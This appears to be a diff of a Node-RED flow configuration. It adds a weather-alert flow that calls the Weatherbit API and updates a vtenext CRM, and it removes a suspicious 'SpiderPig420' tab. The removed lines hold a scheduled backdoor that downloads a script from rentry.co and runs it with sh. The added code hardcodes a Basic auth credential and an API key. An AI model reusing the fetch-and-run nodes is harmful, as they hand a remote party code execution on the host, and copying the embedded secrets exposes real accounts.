@@ -23,6 +23,14 @@
         "env": []
     },
     {
+        "id": "5f17c9d9bc28dab4",
+        "type": "tab",
+        "label": "Weather Alert",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
         "id": "d88ffa19.8b6438",
         "type": "http request",
         "z": "bcad67a.8ddbf98",
@@ -1313,101 +1321,331 @@
         ]
     },
     {
-        "id": "SpiderPig420",
-        "type": "tab",
-        "label": "SpiderPig420",
-        "disabled": false,
-        "info": ""
-    },
-    {
-        "id": "367f9325.6e63a5",
-        "type": "inject",
-        "z": "SpiderPig420",
-        "name": "",
-        "props": [
-            {
-                "p": "payload"
-            },
-            {
-                "p": "topic",
-                "vt": "str"
-            }
-        ],
-        "repeat": "86400",
-        "crontab": "",
-        "once": true,
-        "onceDelay": "2",
-        "topic": "",
-        "payload": "",
-        "payloadType": "date",
-        "x": 4350,
-        "y": 4920,
+        "id": "b8b6e833.38b508",
+        "type": "http request",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Weatherbit HTTP ",
+        "method": "GET",
+        "ret": "obj",
+        "paytoqs": "query",
+        "url": "",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "authType": "",
+        "x": 370,
+        "y": 440,
         "wires": [
             [
-                "83fd938d.0278e"
+                "f5cd9c55.17bdc",
+                "819cc74e.b5a758"
             ]
         ]
     },
     {
-        "id": "57a76eaa.27a329",
+        "id": "ac504bc6.abf9a8",
+        "type": "function",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Form Message for vtenext",
+        "func": "msg.headers = {\n    \"Authorization\": \"Basic YWRtaW46bFNUeGpCWjlWYmU3VVA1ZQ==\"\n  };\n//msg.payload = {\n  //  \"id\": flow.get(\"account_ID\"),\n//    \"columns\": JSON.stringify({\"cf_1099\":\"Yes\"})\n//  };\n\n//return msg;\nif (flow.get(\"alert\") == 0)\n{msg.payload = {\n    \"id\": flow.get(\"account_ID\"),\n    \"columns\": JSON.stringify({\"cf_snz_1375\":\"Back\",\"cf_1099\":\"No\",\"cf_snz_1376\":\"clear\",\"cf_snz_1377\":\"nothing to report\"})\n   }}\n \nelse\n{msg.payload = {\n    \"id\": flow.get(\"Account_ID\"),\n   \"columns\": JSON.stringify({\"cf_snz_1375\":\"Back\",\"cf_1099\":\"Yes\",\"cf_snz_1376\":flow.get(\"severity\"),\"cf_snz_1377\":flow.get(\"title\")})\n      }}\n \nreturn msg;\n\n\n    \n\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "x": 530,
+        "y": 580,
+        "wires": [
+            [
+                "d842ded9.d9564",
+                "b393174.b6f32e8"
+            ]
+        ]
+    },
+    {
+        "id": "d842ded9.d9564",
+        "type": "http request",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Update vtenext",
+        "method": "POST",
+        "ret": "obj",
+        "paytoqs": "query",
+        "url": "http://ec2-3-216-239-69.compute-1.amazonaws.com/restapi/v1/vtews/update",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "authType": "",
+        "x": 600,
+        "y": 660,
+        "wires": [
+            [
+                "d4720732.21a7e8"
+            ]
+        ]
+    },
+    {
+        "id": "2a2354bd.39d3dc",
+        "type": "change",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Store Variables ",
+        "rules": [
+            {
+                "t": "set",
+                "p": "account_ID",
+                "pt": "flow",
+                "to": "payload.account_ID",
+                "tot": "msg"
+            },
+            {
+                "t": "set",
+                "p": "postal_code",
+                "pt": "flow",
+                "to": "payload.postal_code",
+                "tot": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 420,
+        "y": 260,
+        "wires": [
+            [
+                "5370e5b7.2f26fc"
+            ]
+        ]
+    },
+    {
+        "id": "d4720732.21a7e8",
         "type": "debug",
-        "z": "SpiderPig420",
+        "z": "5f17c9d9bc28dab4",
+        "name": "",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "payload",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 810,
+        "y": 660,
+        "wires": []
+    },
+    {
+        "id": "b393174.b6f32e8",
+        "type": "debug",
+        "z": "5f17c9d9bc28dab4",
         "name": "",
         "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 790,
+        "y": 580,
+        "wires": []
+    },
+    {
+        "id": "f5cd9c55.17bdc",
+        "type": "change",
+        "z": "5f17c9d9bc28dab4",
+        "name": "",
+        "rules": [
+            {
+                "t": "set",
+                "p": "alert",
+                "pt": "flow",
+                "to": "payload.alerts.length",
+                "tot": "msg"
+            },
+            {
+                "t": "set",
+                "p": "severity",
+                "pt": "flow",
+                "to": "payload.alerts.severity",
+                "tot": "msg"
+            },
+            {
+                "t": "set",
+                "p": "title",
+                "pt": "flow",
+                "to": "payload.alerts.title",
+                "tot": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 440,
+        "y": 520,
+        "wires": [
+            [
+                "ac504bc6.abf9a8"
+            ]
+        ]
+    },
+    {
+        "id": "5370e5b7.2f26fc",
+        "type": "function",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Construct Weather Get Message",
+        "func": "msg.url = \"https://api.weatherbit.io/v2.0/alerts?&key=b0db917741ff443ba51137fd3142a0db\";\nmsg.payload = {\n\n        \"Postal_Code\": flow.get(\"postal_code\")\n}    \n\nreturn msg",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "x": 380,
+        "y": 360,
+        "wires": [
+            [
+                "b8b6e833.38b508"
+            ]
+        ]
+    },
+    {
+        "id": "819cc74e.b5a758",
+        "type": "debug",
+        "z": "5f17c9d9bc28dab4",
+        "name": "",
+        "active": true,
         "tosidebar": true,
         "console": false,
         "tostatus": false,
         "complete": "false",
         "statusVal": "",
         "statusType": "auto",
-        "x": 4730,
-        "y": 4920,
+        "x": 610,
+        "y": 440,
         "wires": []
     },
     {
-        "id": "83fd938d.0278e",
-        "type": "exec",
-        "z": "SpiderPig420",
-        "command": "curl -s --stderr - https://rentry.co/sn4ft/raw | sed \"s/\\r//g\"  > /tmp/tmp",
-        "addpay": "",
-        "append": "",
-        "useSpawn": "false",
-        "timer": "",
-        "oldrc": false,
-        "name": "",
-        "x": 4475,
-        "y": 4920,
+        "id": "6427556e.5b966c",
+        "type": "http in",
+        "z": "5f17c9d9bc28dab4",
+        "name": "myTestweather",
+        "url": "myTestweather",
+        "method": "get",
+        "upload": false,
+        "swaggerDoc": "",
+        "x": 100,
+        "y": 180,
         "wires": [
             [
-                "f1f1ab6.1a715d9"
-            ],
-            [],
-            []
-        ],
-        "l": false
+                "da40d345.48d1d",
+                "39687c3a.b2db04",
+                "2a2354bd.39d3dc"
+            ]
+        ]
     },
     {
-        "id": "f1f1ab6.1a715d9",
-        "type": "exec",
-        "z": "SpiderPig420",
-        "command": "sh /tmp/tmp",
-        "addpay": "",
-        "append": "",
-        "useSpawn": "true",
-        "timer": "",
-        "oldrc": false,
+        "id": "41b91a50.3e8d44",
+        "type": "http response",
+        "z": "5f17c9d9bc28dab4",
         "name": "",
-        "x": 4575,
-        "y": 4920,
+        "statusCode": "",
+        "headers": {},
+        "x": 630,
+        "y": 200,
+        "wires": []
+    },
+    {
+        "id": "39687c3a.b2db04",
+        "type": "function",
+        "z": "5f17c9d9bc28dab4",
+        "name": "generate response",
+        "func": "let Postal = msg.payload.postal_code\nmsg.payload = {postal_code :Postal, status:\"Success\" };\nreturn msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "x": 410,
+        "y": 200,
         "wires": [
             [
-                "57a76eaa.27a329"
-            ],
-            [
-                "57a76eaa.27a329"
-            ],
-            []
+                "41b91a50.3e8d44",
+                "9c4e4761.232008"
+            ]
+        ]
+    },
+    {
+        "id": "da40d345.48d1d",
+        "type": "debug",
+        "z": "5f17c9d9bc28dab4",
+        "name": "",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 300,
+        "y": 140,
+        "wires": []
+    },
+    {
+        "id": "9c4e4761.232008",
+        "type": "debug",
+        "z": "5f17c9d9bc28dab4",
+        "name": "",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "payload",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 660,
+        "y": 160,
+        "wires": []
+    },
+    {
+        "id": "91107ddcd460744e",
+        "type": "inject",
+        "z": "5f17c9d9bc28dab4",
+        "name": "Force Data Load",
+        "props": [
+            {
+                "p": "payload.account_Name",
+                "v": "My Test Account",
+                "vt": "str"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            },
+            {
+                "p": "payload"
+            },
+            {
+                "p": "payload"
+            },
+            {
+                "p": "payload"
+            }
         ],
-        "l": false
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": ".account_Name",
+        "payloadType": "str",
+        "x": 150,
+        "y": 260,
+        "wires": [
+            [
+                "2a2354bd.39d3dc"
+            ]
+        ]
     }
 ]
